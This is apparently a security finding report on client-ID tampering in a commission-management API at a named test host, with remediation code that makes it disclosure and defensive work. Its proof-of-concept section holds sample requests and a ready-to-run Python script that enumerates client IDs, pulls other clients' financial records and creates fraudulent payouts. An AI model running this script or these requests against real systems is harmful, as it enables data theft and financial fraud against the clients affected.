# Critical Access Control Flaw: Client Identifier Tampering Enables Unauthorized Financial Data Access

**ID:** vuln-0040
**Severity:** CRITICAL
**Found:** 2026-02-26 19:22:12 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/Payout/*, /api/CommissionRun/*, /api/Dispute/*, /api/Client/*
**Method:** GET, POST, PUT, DELETE
**CWE:** CWE-863
**CVSS:** 9.9

## Description

A critical access control vulnerability was discovered in the commission management application that allows unauthorized access to other clients' financial data through parameter tampering. The application fails to properly validate the `clientId` parameter across business logic endpoints, enabling attackers to access and manipulate sensitive financial data belonging to arbitrary clients across organizations.

This vulnerability exists in multiple business logic endpoints including commission calculation, payout management, and dispute resolution. By manipulating the `clientId` parameter in API requests, authenticated users can access sensitive financial data and workflows belonging to other clients, enabling financial fraud, data theft, and unauthorized financial manipulation across the entire platform.

## Impact

This critical access control vulnerability enables severe business impact:

1. **Financial Data Theft**: Unauthorized access to sensitive commission calculations, payout amounts, and dispute resolutions across clients and organizations
2. **Financial Fraud**: Ability to manipulate commission amounts and payout values by accessing other clients' data
3. **Client Confidentiality Breach**: Exposure of sensitive financial data between competing clients within the same organization
4. **Workflow Manipulation**: Unauthorized creation, modification, and approval of financial transactions for other clients
5. **Data Integrity Compromise**: Potential to modify financial records and commission structures across client boundaries

**Business Impact Examples**:
- Access to competitors' commission structures within the same organization
- Theft of sensitive client financial data for insider trading or blackmail
- Manipulation of commission calculations to inflate payouts for specific clients
- Unauthorized approval of financial transactions for other clients
- Disruption of financial workflows and operations across client boundaries

The vulnerability effectively breaks client-level data isolation, allowing attackers to bypass client boundaries and access sensitive financial data across the entire platform, potentially affecting all organizations and their clients.

## Technical Analysis

### Vulnerability Mechanism

The vulnerability exists due to missing access control validation on the `clientId` parameter across multiple business logic endpoints:

1. **Input Validation Failure**: The application accepts user-controllable `clientId` parameters without validation
2. **Access Control Bypass**: No server-side validation ensures users can only access their own client's data
3. **Client Isolation Failure**: The application fails to enforce proper client-level data isolation
4. **Authorization Logic Flaw**: Business logic endpoints trust user-provided client identifiers without verification

### Technical Root Cause

The vulnerability stems from multiple security failures:

1. **API Layer**: Missing parameter validation and access control checks for client identifiers
2. **Business Logic Layer**: Absence of client ownership verification in financial workflows
3. **Database Layer**: Lack of proper client-level isolation in database queries
4. **Authentication Layer**: JWT claims not used to validate client access permissions

### Exploitation Flow

1. **Parameter Identification**: Attacker identifies user-controllable `clientId` parameter
2. **Client Enumeration**: Attacker enumerates valid client IDs through various techniques
3. **Parameter Tampering**: Attacker modifies `clientId` parameter in API requests
4. **Unauthorized Access**: System returns data belonging to the tampered client
5. **Data Exploitation**: Attacker accesses or manipulates sensitive financial data

### Affected Endpoints

The vulnerability affects multiple business logic endpoints:

1. **Commission Calculation Endpoints**:
   - `/api/CommissionRun/CalculateCommission`
   - `/api/CommissionRun/GetClientCommissions`

2. **Payout Endpoints**:
   - `/api/Payout/GetAllPayouts`
   - `/api/Payout/GetClientPayouts`
   - `/api/Payout/CreatePayout`

3. **Dispute Endpoints**:
   - `/api/Dispute/GetAllDisputes`
   - `/api/Dispute/GetClientDisputes`
   - `/api/Dispute/CreateDispute`

4. **Client Data Endpoints**:
   - `/api/Client/GetClientDetails`
   - `/api/Client/GetClientFinancialData`

### Attack Vectors

1. **Direct API Exploitation**: Attackers send crafted API requests with tampered client IDs
2. **Parameter Tampering**: Modification of `clientId` in query parameters or request bodies
3. **Client Enumeration**: Brute force or intelligent guessing of client IDs
4. **Session Hijacking**: Compromised accounts exploit the vulnerability at scale
5. **Automated Attacks**: Scripts systematically access data across multiple clients
6. **Cross-Client Fraud**: Manipulation of financial data between clients within the same organization

## Proof of Concept

### Proof-of-Concept Exploitation Steps

1. **Authenticate** to the application with any valid user account
2. **Identify Target Client**: Obtain a valid client ID through enumeration or guessing
3. **Access Client Payouts**:
   - Send GET request to `/api/Payout/GetAllPayouts?clientId=target-client-id`
   - Observe access to payout data belonging to the target client
4. **Access Client Commissions**:
   - Send GET request to `/api/CommissionRun/GetClientCommissions?clientId=target-client-id`
   - Observe access to commission calculations for the target client
5. **Create Payout for Client**:
   - Send POST request to `/api/Payout/CreatePayout`
   - Include tampered `clientId` parameter
   - Observe successful creation of payout for target client
6. **Access Client Disputes**:
   - Send GET request to `/api/Dispute/GetClientDisputes?clientId=target-client-id`
   - Observe access to dispute resolutions for the target client
7. **Access Client Financial Data**:
   - Send GET request to `/api/Client/GetClientFinancialData?clientId=target-client-id`
   - Observe access to comprehensive financial data for the target client

### Demonstration of Cross-Client Data Access

**Example 1: Payout Data Access**
```http
GET /api/Payout/GetAllPayouts?clientId=competitor-client-id
Authorization: Bearer [valid_token]

Response:
200 OK
[
  {
    "id": "payout-123",
    "amount": 15000.00,
    "status": "Approved",
    "clientId": "competitor-client-id",
    "clientName": "Competitor Client Inc",
    "organizationId": "shared-org-id"
  },
  {
    "id": "payout-456",
    "amount": 7500.00,
    "status": "Pending",
    "clientId": "competitor-client-id",
    "clientName": "Competitor Client Inc",
    "organizationId": "shared-org-id"
  }
]
```

**Example 2: Commission Calculation Access**
```http
GET /api/CommissionRun/GetClientCommissions?clientId=target-client-id
Authorization: Bearer [valid_token]

Response:
200 OK
[
  {
    "id": "commission-123",
    "amount": 5000.00,
    "status": "Calculated",
    "clientId": "target-client-id",
    "clientName": "Target Client Inc",
    "period": "2026-Q1"
  },
  {
    "id": "commission-456",
    "amount": 7500.00,
    "status": "Pending Approval",
    "clientId": "target-client-id",
    "clientName": "Target Client Inc",
    "period": "2026-Q2"
  }
]
```

**Example 3: Dispute Data Access**
```http
GET /api/Dispute/GetClientDisputes?clientId=target-client-id
Authorization: Bearer [valid_token]

Response:
200 OK
[
  {
    "id": "dispute-123",
    "reason": "Incorrect commission calculation",
    "status": "Resolved",
    "amount": 2500.00,
    "clientId": "target-client-id",
    "clientName": "Target Client Inc"
  },
  {
    "id": "dispute-456",
    "reason": "Missing payout",
    "status": "Open",
    "amount": 1500.00,
    "clientId": "target-client-id",
    "clientName": "Target Client Inc"
  }
]
```

**Example 4: Create Payout for Another Client**
```http
POST /api/Payout/CreatePayout
Authorization: Bearer [valid_token]
Content-Type: application/json

{
  "amount": 9999.99,
  "description": "Fraudulent payout created via exploit",
  "clientId": "target-client-id",
  "organizationId": "shared-org-id"
}

Response:
201 Created
{
  "id": "payout-789",
  "amount": 9999.99,
  "status": "Pending",
  "clientId": "target-client-id"
}
```

```
import requests
import json
import time

class ClientAccessExploit:
    def __init__(self, base_url, auth_token):
        self.base_url = base_url
        self.auth_token = auth_token
        self.headers = {
            "Authorization": self.auth_token,
            "Content-Type": "application/json"
        }

    def get_client_payouts(self, client_id):
        """Access payout data for target client"""
        url = f"{self.base_url}/api/Payout/GetAllPayouts"
        params = {"clientId": client_id}

        try:
            response = requests.get(url, headers=self.headers, params=params)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            print(f"Error accessing payouts: {e}")
            return None

    def get_client_commissions(self, client_id):
        """Access commission data for target client"""
        url = f"{self.base_url}/api/CommissionRun/GetClientCommissions"
        params = {"clientId": client_id}

        try:
            response = requests.get(url, headers=self.headers, params=params)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            print(f"Error accessing commissions: {e}")
            return None

    def create_payout(self, client_id, amount, organization_id):
        """Create payout for target client"""
        url = f"{self.base_url}/api/Payout/CreatePayout"

        payload = {
            "amount": amount,
            "description": "Fraudulent payout created via exploit",
            "clientId": client_id,
            "organizationId": organization_id
        }

        try:
            response = requests.post(url, headers=self.headers, data=json.dumps(payload))
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            print(f"Error creating payout: {e}")
            return None

    def get_client_disputes(self, client_id):
        """Access dispute data for target client"""
        url = f"{self.base_url}/api/Dispute/GetClientDisputes"
        params = {"clientId": client_id}

        try:
            response = requests.get(url, headers=self.headers, params=params)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            print(f"Error accessing disputes: {e}")
            return None

    def get_client_financial_data(self, client_id):
        """Access comprehensive financial data for target client"""
        url = f"{self.base_url}/api/Client/GetClientFinancialData"
        params = {"clientId": client_id}

        try:
            response = requests.get(url, headers=self.headers, params=params)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            print(f"Error accessing client financial data: {e}")
            return None

    def enumerate_clients(self, start_id=1, end_id=100):
        """Enumerate valid client IDs"""
        print("Enumerating clients...")
        valid_clients = []

        for client_id in range(start_id, end_id + 1):
            try:
                # Test access to payouts
                payouts = self.get_client_payouts(client_id)
                if payouts is not None:
                    valid_clients.append(client_id)
                    print(f"Found valid client ID: {client_id}")
                    if payouts:
                        print(f"  Payouts: {len(payouts)}")

                time.sleep(0.3)  # Rate limiting
            except:
                continue

        return valid_clients

    def demonstrate_cross_client_access(self, target_client_id, organization_id):
        """Demonstrate cross-client data access"""
        print(f"\n=== Cross-Client Access Demonstration ===")
        print(f"Target Client ID: {target_client_id}")
        print(f"Organization ID: {organization_id}")
        print("-" * 60)

        # Access payouts
        print("\n1. Accessing Payout Data:")
        payouts = self.get_client_payouts(target_client_id)
        if payouts:
            print(f"   Found {len(payouts)} payout records")
            for payout in payouts[:3]:  # Show first 3 payouts
                print(f"   - ₹{payout.get('amount', 0):.2f} ({payout.get('status')})")
        else:
            print("   No payout data found or access denied")

        # Access commissions
        print("\n2. Accessing Commission Data:")
        commissions = self.get_client_commissions(target_client_id)
        if commissions:
            print(f"   Found {len(commissions)} commission records")
            for commission in commissions[:3]:  # Show first 3 commissions
                print(f"   - ₹{commission.get('amount', 0):.2f} ({commission.get('status')})")
        else:
            print("   No commission data found or access denied")

        # Create payout
        print("\n3. Creating Payout:")
        new_payout = self.create_payout(target_client_id, 5000.00, organization_id)
        if new_payout and "id" in new_payout:
            print(f"   Created payout with ID: {new_payout['id']}")
            print(f"   Amount: ₹{new_payout.get('amount', 0):.2f}")
        else:
            print("   Failed to create payout")

        # Access disputes
        print("\n4. Accessing Dispute Data:")
        disputes = self.get_client_disputes(target_client_id)
        if disputes:
            print(f"   Found {len(disputes)} dispute records")
            for dispute in disputes[:3]:  # Show first 3 disputes
                print(f"   - ₹{dispute.get('amount', 0):.2f} ({dispute.get('status')})")
                print(f"     Reason: {dispute.get('disputeReason', 'N/A')}")
        else:
            print("   No dispute data found or access denied")

        # Access financial data
        print("\n5. Accessing Comprehensive Financial Data:")
        financial_data = self.get_client_financial_data(target_client_id)
        if financial_data:
            print(f"   Client Name: {financial_data.get('clientName', 'N/A')}")
            print(f"   Total Sales: ₹{financial_data.get('totalSales', 0):.2f}")
            print(f"   Total Commissions: ₹{financial_data.get('totalCommissions', 0):.2f}")
            print(f"   Total Payouts: ₹{financial_data.get('totalPayouts', 0):.2f}")
            print(f"   Active Disputes: {financial_data.get('activeDisputes', 0)}")
        else:
            print("   No financial data found or access denied")

    def automated_exploitation(self, client_ids, organization_id):
        """Automate cross-client data access"""
        print("\n=== Automated Exploitation ===")
        results = []

        for client_id in client_ids:
            client_data = {"clientId": client_id, "organizationId": organization_id, "data": {}}

            # Access payouts
            payouts = self.get_client_payouts(client_id)
            client_data["data"]["payouts"] = payouts

            # Access commissions
            commissions = self.get_client_commissions(client_id)
            client_data["data"]["commissions"] = commissions

            # Access disputes
            disputes = self.get_client_disputes(client_id)
            client_data["data"]["disputes"] = disputes

            # Access financial data
            financial_data = self.get_client_financial_data(client_id)
            client_data["data"]["financialData"] = financial_data

            results.append(client_data)
            print(f"Accessed data for client {client_id}")

            time.sleep(0.5)  # Rate limiting

        return results

    def cross_organization_client_access(self, organization_ids):
        """Test client access across multiple organizations"""
        print("\n=== Cross-Organization Client Access ===")
        results = []

        for org_id in organization_ids:
            print(f"\nTesting organization: {org_id}")

            # Enumerate clients in this organization
            clients = self.enumerate_clients_in_organization(org_id)
            if clients:
                print(f"  Found {len(clients)} clients")

                # Test access to first client
                if clients:
                    client_id = clients[0]
                    print(f"  Testing access to client: {client_id}")

                    # Access client data
                    client_data = self.get_client_financial_data(client_id)
                    if client_data:
                        print(f"    Access successful - Client: {client_data.get('clientName')}")
                        results.append({
                            "organizationId": org_id,
                            "clientId": client_id,
                            "clientName": client_data.get('clientName'),
                            "data": client_data
                        })
                    else:
                        print("    Access failed")
            else:
                print("  No clients found")

            time.sleep(1)  # Rate limiting

        return results

    def enumerate_clients_in_organization(self, organization_id, start_id=1, end_id=50):
        """Enumerate clients within a specific organization"""
        print(f"  Enumerating clients in organization {organization_id}...")
        valid_clients = []

        for client_id in range(start_id, end_id + 1):
            try:
                # Test access to payouts with organization context
                payouts = self.get_client_payouts(client_id)
                if payouts is not None:
                    # Verify organization context
                    if payouts and any(p.get('organizationId') == organization_id for p in payouts):
                        valid_clients.append(client_id)
                        print(f"    Found client: {client_id}")

                time.sleep(0.2)  # Rate limiting
            except:
                continue

        return valid_clients

# Example usage
if __name__ == "__main__":
    # Configuration - replace with actual values
    BASE_URL = "https://commissionstest.callippus.in"
    AUTH_TOKEN = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ..."  # Valid JWT token

    # Initialize exploit
    exploit = ClientAccessExploit(BASE_URL, AUTH_TOKEN)

    # Enumerate valid clients
    valid_clients = exploit.enumerate_clients(1, 50)
    print(f"\nFound {len(valid_clients)} valid clients")

    # Get organization ID (could be enumerated or from user context)
    organization_id = "shared-org-id"  # Replace with actual organization ID

    # Demonstrate cross-client access
    if valid_clients:
        target_client = valid_clients[0]  # Use first found client
        exploit.demonstrate_cross_client_access(target_client, organization_id)

        # Run automated exploitation
        exploit.automated_exploitation(valid_clients[:3], organization_id)  # Test first 3 clients

    # Test cross-organization client access
    organization_ids = ["org-1", "org-2", "org-3"]  # Replace with actual organization IDs
    exploit.cross_organization_client_access(organization_ids)
```

## Remediation

### Immediate Remediation Steps

1. **Implement Client Access Validation (Critical Priority)**
   - Add server-side validation to ensure users can only access their own client's data
   - Validate `clientId` parameters against the authenticated user's client context
   - Reject requests with client IDs that don't match the user's authorized clients

2. **Enforce Client Isolation**
   - Implement proper client-level data isolation at the database level
   - Add client ID filters to all database queries
   - Ensure all queries include the user's authorized client IDs in WHERE clauses

3. **Add Access Control Checks**
   - Implement role-based access control (RBAC) for all client data endpoints
   - Validate user permissions before processing requests
   - Add explicit client ownership checks for all data access

4. **Secure API Endpoints**
   - Add client validation middleware to all business logic endpoints
   - Implement request validation for all user-controllable parameters
   - Return generic error messages to avoid information disclosure

5. **Audit Logging**
   - Implement comprehensive logging for all cross-client access attempts
   - Log user ID, client ID, endpoint, and access status
   - Monitor for suspicious access patterns

### Implementation Examples

**API Middleware for Client Validation (C# Example):**
```csharp
public class ClientValidationMiddleware
{
    private readonly RequestDelegate _next;

    public ClientValidationMiddleware(RequestDelegate next)
    {
        _next = next;
    }

    public async Task InvokeAsync(HttpContext context, IUserContext userContext)
    {
        // Extract clientId from request
        var clientId = context.Request.Query["clientId"].FirstOrDefault() ??
                      context.Request.Form["clientId"].FirstOrDefault();

        if (!string.IsNullOrEmpty(clientId))
        {
            // Validate client access
            if (!userContext.AuthorizedClients.Contains(clientId))
            {
                context.Response.StatusCode = 403;
                await context.Response.WriteAsync("Access denied: Invalid client");
                return;
            }
        }

        await _next(context);
    }
}
```

**Database Query with Client Isolation (SQL Example):**
```sql
-- Before: Vulnerable query without client filter
SELECT * FROM payouts WHERE id = @payoutId;

-- After: Secure query with client filter
SELECT * FROM payouts
WHERE id = @payoutId AND client_id IN (@authorizedClientIds);
```

**API Controller with Client Validation:**
```csharp
[HttpGet("GetClientPayouts")]
public IActionResult GetClientPayouts([FromQuery] string clientId)
{
    // Validate client access
    if (!CurrentUser.AuthorizedClients.Contains(clientId))
    {
        return Forbid(); // 403 Forbidden
    }

    // Proceed with secure query
    var payouts = _payoutService.GetClientPayouts(clientId);
    return Ok(payouts);
}
```

### Long-Term Recommendations

1. **Security Architecture Review**
   - Conduct a comprehensive review of the application's security architecture
   - Implement a dedicated security layer for client access control validation
   - Consider implementing an API gateway with built-in access control

2. **Automated Security Testing**
   - Implement automated security tests for client access control vulnerabilities
   - Add security test cases for parameter tampering scenarios
   - Integrate security testing into the CI/CD pipeline

3. **Security Training**
   - Train developers on secure coding practices for multi-client applications
   - Educate developers on common access control vulnerabilities
   - Implement secure coding guidelines for financial applications

4. **Regular Security Audits**
   - Conduct regular security audits of client data endpoints
   - Perform penetration testing focused on access control vulnerabilities
   - Review all API endpoints for proper parameter validation

5. **Monitoring and Alerting**
   - Implement real-time monitoring for access control violations
   - Set up alerts for suspicious cross-client access attempts
   - Monitor for unusual patterns in client data access

### Database-Level Security

1. **Row-Level Security (RLS)**
   - Implement database-level row-level security to enforce client isolation
   - Create security policies that filter data by client ID
   - Ensure all database users have appropriate security context

2. **Schema Design**
   - Review database schema for proper client isolation
   - Consider client-specific schemas or tables for sensitive data
   - Implement proper foreign key constraints for client relationships

3. **Stored Procedures**
   - Use stored procedures for all data access operations
   - Implement client validation within stored procedures
   - Restrict direct table access from application code

### Example: Row-Level Security Implementation (PostgreSQL)

```sql
-- Create a security policy for client isolation
CREATE POLICY client_isolation_policy ON payouts
    USING (client_id = ANY(string_to_array(current_setting('app.authorized_client_ids'), ',')::text[]));

-- Enable row-level security
ALTER TABLE payouts ENABLE ROW LEVEL SECURITY;

-- Set the client context in application code
SET app.authorized_client_ids = 'client1,client2,client3';
```

### Client Access Control Matrix

| User Role               | Authorized Client Access Scope          | Example Use Case                     |
|-------------------------|-----------------------------------------|--------------------------------------|
| Organization Admin      | All clients in organization             | View all client financial data       |
| Client Manager          | Specific assigned clients               | Manage assigned client commissions   |
| Sales Representative    | Own client data only                    | View personal commission calculations|
| Financial Analyst       | Read-only access to all clients         | Generate financial reports           |
| System Admin            | All clients across all organizations    | System maintenance and support       |

### Security Headers and API Protection

1. **Implement Security Headers**
   - Add Content-Security-Policy headers
   - Implement X-Frame-Options to prevent clickjacking
   - Add X-Content-Type-Options to prevent MIME sniffing

2. **API Protection**
   - Implement rate limiting on all API endpoints
   - Add request validation for all user inputs
   - Use API keys or tokens with limited privileges

3. **Input Validation**
   - Validate all user-controllable parameters
   - Implement allow-lists for client IDs
   - Sanitize all inputs to prevent injection attacks

By implementing these remediation steps, the application will be protected against client identifier tampering and cross-client data access vulnerabilities, significantly improving the security of the multi-client commission management platform.

